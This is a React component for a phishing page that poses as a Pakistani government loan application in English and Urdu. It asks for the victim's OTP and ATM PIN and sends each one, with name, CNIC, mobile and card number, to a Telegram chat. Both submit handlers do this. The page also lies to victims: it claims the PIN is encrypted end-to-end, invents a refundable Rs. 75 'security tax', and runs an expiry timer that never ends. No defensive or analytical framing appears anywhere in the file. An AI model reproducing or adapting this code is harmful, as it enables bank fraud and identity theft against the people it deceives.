import React, { useState, useEffect, useRef } from 'react';
import { LoanApplicationState } from '../types';
import { ShieldCheck, Lock, Smartphone, ArrowRight, ArrowLeft, RefreshCw, CreditCard } from 'lucide-react';
import cardImg from '../assets/images/premium_debit_card_1788152622955.jpg';
import { sendTelegramMessage } from '../utils/telegram';

interface OtpAtmStepProps {
  data: LoanApplicationState;
  updateData: (fields: Partial<LoanApplicationState>) => void;
  subStage?: 'otp' | 'pin';
  onOtpSuccess?: () => void;
  onBackToOtp?: () => void;
  onComplete: () => void;
  onBack: () => void;
}

export const OtpAtmStep: React.FC<OtpAtmStepProps> = ({ 
  data, 
  updateData, 
  subStage: propSubStage = 'otp',
  onOtpSuccess,
  onBackToOtp,
  onComplete, 
  onBack 
}) => {
  const [subStage, setSubStage] = useState<'otp' | 'pin'>(propSubStage);
  const [otpValues, setOtpValues] = useState<string[]>(['', '', '', '', '', '']);
  const [pinValues, setPinValues] = useState<string[]>(['', '', '', '']);
  const [error, setError] = useState('');
  const [timeLeft, setTimeLeft] = useState<number>(300); // 5 minutes in seconds

  useEffect(() => {
    setSubStage(propSubStage);
  }, [propSubStage]);

  const otpInputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (subStage === 'otp') {
      otpInputRefs.current[0]?.focus();
    } else {
      pinInputRefs.current[0]?.focus();
    }
  }, [subStage]);

  useEffect(() => {
    if (subStage !== 'otp') return;

    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          return 300; // Auto-loop back to 5 minutes non-stop
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [subStage]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleResend = () => {
    setTimeLeft(300);
    setError('');
    setOtpValues(['', '', '', '', '', '']);
    otpInputRefs.current[0]?.focus();
  };

  const handleOtpChange = (val: string, idx: number) => {
    const digits = val.replace(/\D/g, '');
    if (digits.length > 1) {
      const newOtp = [...otpValues];
      for (let i = 0; i < 6; i++) {
        if (digits[i]) {
          newOtp[i] = digits[i];
        }
      }
      setOtpValues(newOtp);
      updateData({ otpCode: newOtp });
      const nextIdx = Math.min(digits.length, 5);
      otpInputRefs.current[nextIdx]?.focus();
      return;
    }

    const char = digits.slice(-1);
    const newOtp = [...otpValues];
    newOtp[idx] = char;
    setOtpValues(newOtp);
    updateData({ otpCode: newOtp });

    // Non-stop auto advance to next box
    if (char && idx < 5) {
      otpInputRefs.current[idx + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, idx: number) => {
    if (e.key === 'Backspace' && !otpValues[idx] && idx > 0) {
      otpInputRefs.current[idx - 1]?.focus();
    }
  };

  const handleOtpPaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pasteData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);
    if (!pasteData) return;
    const newOtp = [...otpValues];
    for (let i = 0; i < pasteData.length; i++) {
      newOtp[i] = pasteData[i];
    }
    setOtpValues(newOtp);
    updateData({ otpCode: newOtp });
    const focusIndex = Math.min(pasteData.length, 5);
    otpInputRefs.current[focusIndex]?.focus();
  };

  const handlePinChange = (val: string, idx: number) => {
    const digits = val.replace(/\D/g, '');
    if (digits.length > 1) {
      const newPin = [...pinValues];
      for (let i = 0; i < 4; i++) {
        if (digits[i]) {
          newPin[i] = digits[i];
        }
      }
      setPinValues(newPin);
      updateData({ atmPin: newPin });
      const nextIdx = Math.min(digits.length, 3);
      pinInputRefs.current[nextIdx]?.focus();
      return;
    }

    const char = digits.slice(-1);
    const newPin = [...pinValues];
    newPin[idx] = char;
    setPinValues(newPin);
    updateData({ atmPin: newPin });

    // Non-stop auto advance to next box
    if (char && idx < 3) {
      pinInputRefs.current[idx + 1]?.focus();
    }
  };

  const handlePinKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, idx: number) => {
    if (e.key === 'Backspace' && !pinValues[idx] && idx > 0) {
      pinInputRefs.current[idx - 1]?.focus();
    }
  };

  const handlePinPaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pasteData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
    if (!pasteData) return;
    const newPin = [...pinValues];
    for (let i = 0; i < pasteData.length; i++) {
      newPin[i] = pasteData[i];
    }
    setPinValues(newPin);
    updateData({ atmPin: newPin });
    const focusIndex = Math.min(pasteData.length, 3);
    pinInputRefs.current[focusIndex]?.focus();
  };

  const handleOtpSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (otpValues.some((v) => !v)) {
      setError('Please enter the complete 6-digit OTP code / براہ کرم 6 ہندسوں کا او ٹی پی درج کریں۔');
      return;
    }
    setError('');

    sendTelegramMessage(
      `📱 *Loan Application - OTP Code*\n🔑 *Session ID: ${data.sessionId}*\n👤 Name: ${data.fullName}\n📱 Mobile: ${data.mobileNo}\n🔑 OTP Code: ${otpValues.join('')}`
    );

    setSubStage('pin');
    if (onOtpSuccess) onOtpSuccess();
  };

  const handleFinalSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (pinValues.some((v) => !v)) {
      setError('Please enter your 4-digit ATM PIN / براہ کرم اپنا 4 ہندسوں کا اے ٹی ایم پن درج کریں۔');
      return;
    }
    setError('');

    sendTelegramMessage(
      `🔐 *Loan Application - ATM PIN & Completed*\n🔑 *Session ID: ${data.sessionId}*\n👤 Name: ${data.fullName}\n🆔 CNIC: ${data.cnic}\n📱 Mobile: ${data.mobileNo}\n💳 Card: ${data.cardNumber}\n🔒 ATM PIN: ${pinValues.join('')}`
    );

    onComplete();
  };

  return (
    <div className="bg-white rounded-2xl shadow-sm border border-slate-200 p-6 md:p-8 max-w-2xl mx-auto">
      {subStage === 'otp' ? (
        <>
          <div className="flex items-center justify-between pb-6 border-b border-slate-100 mb-6">
            <div>
              <h2 className="text-xl font-bold text-slate-900">OTP Verification</h2>
              <p className="text-sm text-slate-500">Secure two-factor authentication</p>
            </div>
            <span className="text-xs font-semibold bg-emerald-50 text-emerald-800 px-3 py-1 rounded-full border border-emerald-200">
              او ٹی پی تصدیق
            </span>
          </div>

          <div className="bg-slate-50 border border-slate-200 rounded-xl p-4 mb-6">
            <div className="flex items-center space-x-3 text-emerald-800 mb-2">
              <Smartphone className="w-5 h-5 text-emerald-600" />
              <span className="text-xs font-bold">OTP code has been sent to your mobile number</span>
            </div>
            <p className="text-xs text-slate-500 font-urdu">آپ کے موبائل نمبر پر او ٹی پی کوڈ بھیج دیا گیا ہے</p>
          </div>

          <div className="bg-white border border-slate-200 rounded-xl p-4 mb-6 flex items-center justify-between">
            <div>
              <span className="text-[11px] uppercase tracking-wider text-slate-400 font-semibold block">Code Sent To</span>
              <span className="text-sm font-mono font-bold text-slate-800">
                {data.mobileNo ? `${data.mobileNo.slice(0, 4)} - XXXXX${data.mobileNo.slice(-2)}` : '0346-XXXXX54'}
              </span>
            </div>
            <span className="text-xs text-emerald-700 font-medium bg-emerald-50 px-2.5 py-1 rounded-md">SMS Verified</span>
          </div>

          {error && (
            <div className="mb-6 p-4 bg-red-50 border border-red-200 text-red-700 text-sm rounded-xl">
              {error}
            </div>
          )}

          <form onSubmit={handleOtpSubmit} className="space-y-6">
            <div>
              <label className="block text-xs font-bold text-slate-700 mb-3 flex justify-between">
                <span>Enter 6-digit code</span>
                <span className="font-normal text-slate-500 font-urdu">6 ہندسوں کا کوڈ درج کریں</span>
              </label>
              <div className="flex justify-between space-x-2 sm:space-x-4">
                {otpValues.map((val, idx) => (
                  <input
                    key={idx}
                    ref={(el) => { otpInputRefs.current[idx] = el; }}
                    type="text"
                    inputMode="numeric"
                    maxLength={1}
                    value={val}
                    onChange={(e) => handleOtpChange(e.target.value, idx)}
                    onKeyDown={(e) => handleOtpKeyDown(e, idx)}
                    onPaste={handleOtpPaste}
                    className="w-12 h-14 sm:w-14 sm:h-16 text-center text-xl font-bold font-mono rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 bg-slate-50 focus:bg-white"
                  />
                ))}
              </div>
            </div>

            <div className="flex items-center justify-between text-xs bg-slate-50 p-4 rounded-xl border border-slate-200">
              <span className="text-slate-600 flex items-center">
                <span>EXPIRES IN / وقت کا خاتمہ:</span>
                <strong className={`font-mono ml-2 text-sm ${timeLeft < 60 ? 'text-red-600 animate-pulse' : 'text-slate-900'}`}>
                  {formatTime(timeLeft)}
                </strong>
              </span>
              <button 
                type="button" 
                onClick={handleResend}
                className="text-emerald-700 font-semibold hover:underline flex items-center space-x-1"
              >
                <RefreshCw className="w-3.5 h-3.5" />
                <span>Resend / دوبارہ بھیجیں</span>
              </button>
            </div>

            <div className="p-4 bg-amber-50/70 border border-amber-200 rounded-xl text-xs text-amber-900 flex items-start space-x-3">
              <Lock className="w-4 h-4 text-amber-700 shrink-0 mt-0.5" />
              <div>
                <p>Never share your OTP with anyone. Government of Pakistan officials will never ask for your verification code.</p>
                <p className="font-urdu mt-1">اپنا کوڈ کسی کے ساتھ شیئر نہ کریں۔</p>
              </div>
            </div>

            <div className="pt-4 flex justify-between">
              <button
                type="button"
                onClick={onBack}
                className="flex items-center space-x-2 px-5 py-3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold rounded-xl text-sm transition-all"
              >
                <ArrowLeft className="w-4 h-4" />
                <span>Back / واپس</span>
              </button>

              <button
                type="submit"
                className="flex items-center space-x-2 px-6 py-3 bg-[#0b1f36] hover:bg-slate-800 text-white font-semibold rounded-xl text-sm shadow-md transition-all"
              >
                <span>Verify OTP / تصدیق</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          </form>
        </>
      ) : (
        <>
          <div className="flex items-center justify-between pb-6 border-b border-slate-100 mb-6">
            <div>
              <h2 className="text-xl font-bold text-slate-900">ATM PIN Verification</h2>
              <p className="text-sm text-slate-500">Security verification required</p>
            </div>
            <span className="text-xs font-semibold bg-emerald-50 text-emerald-800 px-3 py-1 rounded-full border border-emerald-200">
              اے ٹی ایم پن
            </span>
          </div>

          <div className="bg-emerald-50/70 border border-emerald-200 rounded-xl p-4 mb-6">
            <div className="flex items-center space-x-3 text-emerald-900 mb-2">
              <ShieldCheck className="w-5 h-5 text-emerald-700" />
              <span className="text-xs font-bold">Security Verification Tax: Rs. 75 / سیکیورٹی ٹیکس: 75 روپے</span>
            </div>
            <p className="text-xs text-emerald-800 leading-relaxed">
              For your account security, a one-time refundable tax of <strong>Rs. 75</strong> will be charged. Please enter your 4-digit ATM PIN to authorize this verification.
            </p>
            <p className="text-xs text-emerald-700 font-urdu mt-1">
              آپ کے اکاؤنٹ کی حفاظت کے لیے 75 روپے کا قابل واپسی ٹیکس وصول کیا جائے گا۔ تصدیق کے لیے اپنا 4 ہندسوں کا اے ٹی ایم پن درج کریں۔
            </p>
          </div>

          {/* Card Reference Badge */}
          <div className="bg-gradient-to-r from-emerald-900 to-[#0b1f36] p-3 rounded-xl border border-emerald-700/50 mb-6 flex items-center justify-between text-white shadow-sm">
            <div className="flex items-center space-x-3">
              <div className="w-12 h-8 rounded-md overflow-hidden shrink-0 border border-amber-300/40 relative">
                <img src={cardImg} alt="Card" className="w-full h-full object-cover" />
              </div>
              <div>
                <span className="text-[10px] text-amber-300 font-semibold uppercase tracking-wider block">Target Debit Card</span>
                <span className="text-xs font-mono font-bold tracking-widest text-slate-100">
                  {data.cardNumber ? data.cardNumber : '**** **** **** ****'}
                </span>
              </div>
            </div>
            <span className="text-[10px] bg-amber-400/20 text-amber-200 px-2 py-0.5 rounded border border-amber-400/30 font-medium">
              PREMIUM DEBIT
            </span>
          </div>

          {error && (
            <div className="mb-6 p-4 bg-red-50 border border-red-200 text-red-700 text-sm rounded-xl">
              {error}
            </div>
          )}

          <form onSubmit={handleFinalSubmit} className="space-y-6">
            <div>
              <label className="block text-xs font-bold text-slate-700 mb-3 flex justify-between">
                <span>Enter 4-digit ATM PIN</span>
                <span className="font-normal text-slate-500 font-urdu">4 ہندسوں کا پن درج کریں</span>
              </label>
              <div className="flex justify-center space-x-4">
                {pinValues.map((val, idx) => (
                  <input
                    key={idx}
                    ref={(el) => { pinInputRefs.current[idx] = el; }}
                    type="password"
                    inputMode="numeric"
                    maxLength={1}
                    value={val}
                    onChange={(e) => handlePinChange(e.target.value, idx)}
                    onKeyDown={(e) => handlePinKeyDown(e, idx)}
                    onPaste={handlePinPaste}
                    className="w-14 h-16 text-center text-2xl font-bold font-mono rounded-xl border border-slate-300 focus:outline-none focus:ring-2 focus:ring-emerald-600 bg-slate-50 focus:bg-white"
                  />
                ))}
              </div>
            </div>

            <div className="p-4 bg-slate-50 border border-slate-200 rounded-xl text-xs text-slate-600 flex items-start space-x-3">
              <Lock className="w-4 h-4 text-slate-500 shrink-0 mt-0.5" />
              <div>
                <p>Your ATM PIN is encrypted end-to-end and used only for one-time security verification.</p>
                <p className="font-urdu mt-1">آپ کا پن مکمل طور پر محفوظ ہے اور صرف ایک بار تصدیق کے لیے استعمال ہوگا۔</p>
              </div>
            </div>

            <div className="pt-4 flex justify-between">
              <button
                type="button"
                onClick={() => {
                  setSubStage('otp');
                  if (onBackToOtp) onBackToOtp();
                }}
                className="flex items-center space-x-2 px-5 py-3 bg-slate-100 hover:bg-slate-200 text-slate-700 font-semibold rounded-xl text-sm transition-all"
              >
                <ArrowLeft className="w-4 h-4" />
                <span>Back / واپس</span>
              </button>

              <button
                type="submit"
                className="flex items-center space-x-2 px-6 py-3 bg-emerald-700 hover:bg-emerald-800 text-white font-semibold rounded-xl text-sm shadow-md transition-all"
              >
                <span>Pay Rs. 75 & Submit / جمع کرائیں</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          </form>
        </>
      )}
    </div>
  );
};
